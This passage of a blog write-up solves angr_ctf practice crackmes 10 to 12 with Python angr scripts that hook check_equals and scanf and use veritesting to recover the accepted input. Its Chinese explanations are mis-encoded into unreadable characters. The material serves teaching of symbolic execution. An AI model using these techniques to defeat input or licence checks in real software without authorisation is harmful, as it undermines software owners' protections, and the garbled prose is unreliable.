boolean\">False</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            solution_state <span class=\"token operator\">=</span> i</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Success! Solution is: &#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token comment\">#print(solution0)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    Go<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"10_angr_simprocedures\"><a class=\"markdownIt-Anchor\" href=\"#10_angr_simprocedures\">#</a> 10_angr_simprocedures</h3>\n<p>å­¦ä¹ å¦‚ä½•åˆ©ç”¨å‡½æ•°åè¿›è¡Œ hookï¼Œè€Œä¸æ˜¯å¤æ‚çš„åˆ©ç”¨å‡½æ•°çš„è°ƒç”¨åœ°å€</p>\n<p>ç¬¬åé¢˜çš„è·¯å¾„çˆ†ç‚¸ä»ç„¶å‘ç”Ÿåœ¨ check_equals å‡½æ•°å½“ä¸­ï¼Œä¸ä¸Šä¸€é¢˜çš„åŒºåˆ«åœ¨äºï¼Œæ­¤æ—¶è¾“å…¥çš„å­—ç¬¦ä¸²è¢«ä¿å­˜åœ¨å±€éƒ¨å˜é‡å½“ä¸­ï¼Œæˆ‘ä»¬æ— æ³•æå‰å¾—çŸ¥å®ƒçš„åœ°å€ï¼Œå› æ­¤å¦‚æœè¦ hook æ‰ check å‡½æ•°ï¼Œåˆ™å¿…é¡»è·å– check å‡½æ•°çš„å‚æ•°ã€‚</p>\n<p>åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° check_equals è¢«è°ƒç”¨äº†å¾ˆå¤šæ¬¡ï¼Œä»¥è‡´äºæ— æ³•é€šè¿‡åœ°å€ Hook æ¯ä¸ªè°ƒç”¨ä½ç½®ã€‚ è¿™æ—¶æˆ‘ä»¬å¿…é¡»ä½¿ç”¨ SimProcedure ç¼–å†™æˆ‘ä»¬è‡ªå·±çš„ check_equals å®ç°ï¼Œç„¶åé€šè¿‡å‡½æ•°å Hook æ‰€æœ‰å¯¹ check_equals çš„è°ƒç”¨</p>\n<p>å› æ­¤éœ€è¦ä½¿ç”¨ hook_symbol çš„æ–¹å¼æ¥ hook æ‰ check å‡½æ•°</p>\n<h4 id=\"hooking-symbols\"><a class=\"markdownIt-Anchor\" href=\"#hooking-symbols\">#</a> Hooking Symbols</h4>\n<p>æ¯ä¸€ä¸ªç¨‹åºéƒ½æœ‰ä¸€ä¸ªç¬¦å·è¡¨ï¼Œangr å¯ä»¥ç¡®ä¿ä»æ¯ä¸ªå¯¼å…¥ç¬¦å·éƒ½å¯ä»¥è§£æå‡ºåœ°å€ï¼Œå¯ä»¥ä½¿ç”¨ angr æä¾›çš„ <code>Project.hook_symbol</code> API æ¥é€šè¿‡ç¬¦å·åæ¥ Hook å‡½æ•°æ‰€æœ‰çš„è°ƒç”¨åœ°å€ï¼Œè¿™æ„å‘³ç€å¯ä»¥ç”¨è‡ªå·±çš„ä»£ç æ›¿æ¢å‡½æ•°</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>time_strat <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>perf_counter<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">good</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    tag <span class=\"token operator\">=</span> <span class=\"token string\">b'Good'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span> <span class=\"token keyword\">if</span> tag <span class=\"token keyword\">else</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">bad</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    tag <span class=\"token operator\">=</span> <span class=\"token string\">b'Try'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span> <span class=\"token keyword\">if</span> tag <span class=\"token keyword\">else</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">'./10_angr_simprocedures'</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>init_state <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Hook</span><span class=\"token punctuation\">(</span>angr<span class=\"token punctuation\">.</span>SimProcedure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\"># åä¸¤ä¸ªå‚æ•°å³ä¸º check_equals å‡½æ•°çš„å‚æ•°</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        input_buffer <span class=\"token operator\">=</span> addr</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        input_size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token comment\"># ä»å†…å­˜ä¸­è¯»å–è¾“å…¥</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        input_str <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>input_buffer<span class=\"token punctuation\">,</span> input_size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        right_str <span class=\"token operator\">=</span> <span class=\"token string\">'OSIWHBXIFOQVSBZB'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token comment\"># æ¯”è¾ƒè¿”å›ç¬¦å·çº¦æŸ</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        result <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>If<span class=\"token punctuation\">(</span>input_str <span class=\"token operator\">==</span> right_str<span class=\"token punctuation\">,</span> claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                            claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># funcname ä¸€å®šè¦ç›¸åŒï¼Œå¯åœ¨ IDA ä¸­æŸ¥çœ‹</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>hooked_funcname <span class=\"token operator\">=</span> <span class=\"token string\">'check_equals_OSIWHBXIFOQVSBZB'</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>hook_symbol<span class=\"token punctuation\">(</span>hooked_funcname<span class=\"token punctuation\">,</span> Hook<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>simgr <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>init_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>simgr<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>good<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>bad<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">if</span> simgr<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simgr<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    flag <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"11_angr_sim_scanf\"><a class=\"markdownIt-Anchor\" href=\"#11_angr_sim_scanf\">#</a> 11_angr_sim_scanf</h3>\n<p>å¦‚é¢˜ï¼Œè¿™é¢˜ä¸»è¦æ˜¯å­¦ä¹ å¦‚ä½• hook <code>scanf</code>  å‡½æ•°ï¼Œæ­¥éª¤å…¶å®ä¸ä¸Šä¸€é¢˜æ˜¯å‡ ä¹ä¸€è‡´çš„ï¼Œå¾—å…ˆæ‰¾åˆ°éœ€è¦ hook çš„å‡½æ•°ç¬¦å·ï¼Œç„¶åç¼–å†™ä¸€ä¸ªç»§æ‰¿ angr.SimProcedure çš„ç±»ï¼Œç„¶ååˆ©ç”¨ <code>hook_symbol</code>  å¯¹å‡½æ•°è¿›è¡Œ hook</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">good</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    tag <span class=\"token operator\">=</span> <span class=\"token string\">b'Good'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span> <span class=\"token keyword\">if</span> tag <span class=\"token keyword\">else</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">bad</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    tag <span class=\"token operator\">=</span> <span class=\"token string\">b'Try'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span> <span class=\"token keyword\">if</span> tag <span class=\"token keyword\">else</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">'./11_angr_sim_scanf'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">ReplacementScanf</span><span class=\"token punctuation\">(</span>angr<span class=\"token punctuation\">.</span>SimProcedure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\"># ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ scanf çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ¥ç€æ˜¯ä¸¤ä¸ª buffer åœ°å€</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> format_string<span class=\"token punctuation\">,</span> scanf0_address<span class=\"token punctuation\">,</span> scanf1_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\"># åœ¨ run ä¸­å®Œæˆ scanf çš„åŠŸèƒ½ï¼Œå³å‘ç›®æ ‡åœ°å€å†™å…¥ç¬¦å·</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\"># å®šä¹‰ä¸¤ä¸ªç¬¦å·å˜é‡ï¼Œç”¨äºå†™å…¥ buffer</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        scanf0 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'scanf0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        scanf1 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'scanf1'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\"># å†™å…¥å†…å­˜ï¼Œæœ€åä¸€ä¸ªå‚æ•°æŒ‡å®šå­—èŠ‚åº</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>scanf0_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                                scanf0<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                                endness<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>arch<span class=\"token punctuation\">.</span>memory_endness<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>scanf1_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                                scanf1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                                endness<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>arch<span class=\"token punctuation\">.</span>memory_endness<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\"># ä¿å­˜å˜é‡åˆ°å…¨å±€ï¼Œæ–¹ä¾¿åç»­çº¦æŸæ±‚è§£</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">[</span><span class=\"token string\">'solution0'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> scanf0</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">[</span><span class=\"token string\">'solution1'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> scanf1</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># scanf çš„å‡½æ•°åç§°ï¼Œå¯åœ¨ ida ä¸­æŸ¥çœ‹</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>scanf_symbol <span class=\"token operator\">=</span> <span class=\"token string\">'__isoc99_scanf'</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>project<span class=\"token punctuation\">.</span>hook_symbol<span class=\"token punctuation\">(</span>scanf_symbol<span class=\"token punctuation\">,</span> ReplacementScanf<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>good<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>bad<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token comment\"># å¯¹ç¬¦å·å˜é‡è¿›è¡Œçº¦æŸæ±‚è§£</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    stored_solutions0 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">[</span><span class=\"token string\">'solution0'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    stored_solutions1 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">[</span><span class=\"token string\">'solution1'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    scanf0_solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>stored_solutions0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    scanf1_solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>stored_solutions1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>scanf0_solution<span class=\"token punctuation\">,</span> scanf1_solution<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>run æ–¹æ³•ç”¨äºæ‰§è¡Œ ReplacementScanf ç±»çš„å®ä¾‹ã€‚è¯¥æ–¹æ³•æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¸º format_stringã€param0 å’Œ param1ã€‚</p>\n<h3 id=\"12_angr_veritesting\"><a class=\"markdownIt-Anchor\" href=\"#12_angr_veritesting\">#</a> 12_angr_veritesting</h3>\n<p>æ­¤é¢˜ä¸ä¹‹å‰çš„é¢˜ç›®ä¸åŒçš„åœ°æ–¹åœ¨äºï¼Œå®ƒä¸ä»…æ˜¯æŒ‰ä½è¿›è¡Œæ¯”è¾ƒçš„ï¼Œè€Œä¸”æ˜¯æŒ‰ä½è¿›è¡Œæ··æ·†åé©¬ä¸Šæ¯”è¾ƒã€‚ä¹‹å‰çš„é¢˜ç›®éƒ½æ˜¯æ•´ä½“æ··æ·†åæ¯”è¾ƒã€‚å› æ­¤è·¯å¾„çˆ†ç‚¸åŒæ—¶å‡ºç°åœ¨æ··æ·†å’Œæ¯”è¾ƒä¸¤ä¸ªåœ°æ–¹ã€‚</p>\n<p>è€ƒè™‘ä½¿ç”¨è·¯å¾„å½’å¹¶çš„æœç´¢ç­–ç•¥ veritesting è§£é¢˜ (ä½“éªŒä¸€ä¸‹ veritesting)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token builtin\">file</span><span class=\"token operator\">=</span><span class=\"token string\">'12_angr_veritesting'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tproject<span class=\"token operator\">=</span>angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tinitial_state<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">#Veritesting ç»“åˆäº†é™æ€ç¬¦åˆæ‰§è¡Œä¸åŠ¨æ€ç¬¦å·æ‰§è¡Œï¼Œå‡å°‘äº†è·¯å¾„çˆ†ç‚¸çš„å½±å“</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tsimulation<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">,</span>veritesting<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">def</span> <span class=\"token function\">succ</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token string\">b'Good Job.'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">def</span> <span class=\"token function\">fail</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token string\">b'Try again.'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 